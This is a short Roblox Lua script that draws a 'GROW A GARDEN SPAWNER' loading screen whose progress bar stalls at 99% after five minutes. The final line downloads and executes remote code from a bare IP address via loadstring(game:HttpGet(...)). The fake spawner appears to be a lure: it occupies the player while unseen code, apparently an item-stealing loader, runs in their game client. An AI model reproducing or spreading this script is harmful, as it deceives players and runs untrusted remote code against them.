local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer.PlayerGui

-- Create loading screen frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BackgroundTransparency = 0.5
frame.Parent = gui

-- Text above progress bar
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.Text = "GROW A GARDEN SPAWNER"
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.TextScaled = true
title.Parent = frame

-- Progress bar background
local progressBarBg = Instance.new("Frame")
progressBarBg.Size = UDim2.new(0.9, 0, 0, 20)
progressBarBg.Position = UDim2.new(0.05, 0, 0, 80)
progressBarBg.BackgroundColor3 = Color3.new(0, 0, 0)
progressBarBg.BackgroundTransparency = 0.7
progressBarBg.Parent = frame

-- Progress bar
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
progressBar.Parent = progressBarBg

-- Animate progress bar to 99% over 5 minutes
local duration = 300 -- 5 minutes in seconds
local targetProgress = 0.99
local startTime = tick()

game:GetService("RunService").Heartbeat:Connect(function()
    local elapsed = tick() - startTime
    local progress = math.min(elapsed / duration, targetProgress)
    progressBar.Size = UDim2.new(progress, 0, 1, 0)
end)

-- Your original script
loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
